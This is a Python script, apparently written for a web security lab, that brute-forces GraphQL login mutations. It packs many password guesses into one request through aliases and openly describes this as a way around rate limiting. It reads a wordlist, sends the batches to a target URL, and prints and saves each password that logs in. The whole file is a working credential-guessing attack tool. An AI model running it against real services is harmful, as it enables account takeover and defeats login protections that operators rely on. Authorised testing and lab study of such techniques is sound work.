#!/usr/bin/env python3
"""
GraphQL Alias Bruteforcer
Usage:
  python gql_brute.py -w wordlist.txt -u http://target/graphql -q 'login(input:{password:"FUZZ",username:"carlos"}){token success}'
  python gql_brute.py -w wordlist.txt --dry-run -q 'login(input:{password:"FUZZ",username:"carlos"}){token success}'
"""

import argparse
import sys
import requests
import json
import re


def load_wordlist(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        words = [line.strip() for line in f if line.strip()]
    return words


def build_query(words: list[str], query_template: str, prefix: str, batch_size: int) -> list[str]:
    """Split words into batches and build aliased GraphQL queries."""
    batches = []
    for i in range(0, len(words), batch_size):
        chunk = words[i:i + batch_size]
        aliases = []
        for j, word in enumerate(chunk):
            idx = i + j
            alias = f"{prefix}{idx}"
            aliased = f"{alias}:{query_template.replace('FUZZ', word)}"
            aliases.append(aliased)
        body = "mutation {\n  " + "\n  ".join(aliases) + "\n}"
        batches.append((chunk, body))
    return batches


def send_query(url: str, query: str, headers: dict) -> dict:
    payload = {"query": query}
    resp = requests.post(url, json=payload, headers=headers, timeout=15)
    resp.raise_for_status()
    return resp.json()


def check_success(data: dict, prefix: str, words: list[str], start_idx: int) -> list[tuple]:
    """Return list of (alias, password, response_data) for successful logins."""
    hits = []
    if "data" not in data:
        return hits
    for i, word in enumerate(words):
        alias = f"{prefix}{start_idx + i}"
        result = data["data"].get(alias)
        if result and result.get("success"):
            hits.append((alias, word, result))
    return hits


def dry_run(words: list[str], query_template: str, prefix: str, batch_size: int):
    print(f"[*] Wordlist: {len(words)} passwords")
    print(f"[*] Batch size: {batch_size}")
    print(f"[*] Total batches: {(len(words) + batch_size - 1) // batch_size}\n")
    batches = build_query(words, query_template, prefix, batch_size)
    print("=== Sample query (first batch) ===")
    print(batches[0][1])


def main():
    parser = argparse.ArgumentParser(
        description="GraphQL alias bruteforcer — bypasses rate limiting by batching aliases"
    )
    parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist file")
    parser.add_argument("-u", "--url", help="Target GraphQL endpoint URL")
    parser.add_argument(
        "-q", "--query", required=True,
        help='Login query with FUZZ as password placeholder'
    )
    parser.add_argument("-p", "--prefix", default="brute", help="Alias prefix (default: brute)")
    parser.add_argument("-b", "--batch-size", type=int, default=100, help="Aliases per request (default: 100)")
    parser.add_argument("--header", action="append", metavar="KEY:VALUE", help="Extra headers (repeatable)")
    parser.add_argument("--dry-run", action="store_true", help="Print generated query without sending")
    parser.add_argument("-o", "--output", help="Save hits to file")
    args = parser.parse_args()

    words = load_wordlist(args.wordlist)
    print(f"[*] Loaded {len(words)} passwords from {args.wordlist}")

    if args.dry_run:
        dry_run(words, args.query, args.prefix, args.batch_size)
        return

    if not args.url:
        print("[-] --url is required unless using --dry-run")
        sys.exit(1)

    headers = {"Content-Type": "application/json"}
    if args.header:
        for h in args.header:
            k, _, v = h.partition(":")
            headers[k.strip()] = v.strip()

    batches = build_query(words, args.query, args.prefix, args.batch_size)
    total_batches = len(batches)
    hits = []

    for batch_num, (chunk, query_body) in enumerate(batches, 1):
        start_idx = (batch_num - 1) * args.batch_size
        print(f"[*] Sending batch {batch_num}/{total_batches} ({len(chunk)} aliases)...", end=" ", flush=True)
        try:
            data = send_query(args.url, query_body, headers)
        except requests.RequestException as e:
            print(f"ERROR: {e}")
            continue

        if "errors" in data and not data.get("data"):
            print(f"SERVER ERROR: {data['errors'][0].get('message', '')}")
            continue

        batch_hits = check_success(data, args.prefix, chunk, start_idx)
        if batch_hits:
            for alias, password, result in batch_hits:
                print(f"\n[+] HIT! Password: {password} | Response: {result}")
                hits.append({"alias": alias, "password": password, "response": result})
        else:
            print("no hits")

    print(f"\n[*] Done. {len(hits)} credential(s) found.")

    if hits and args.output:
        with open(args.output, "w") as f:
            json.dump(hits, f, indent=2)
        print(f"[*] Results saved to {args.output}")


if __name__ == "__main__":
    main()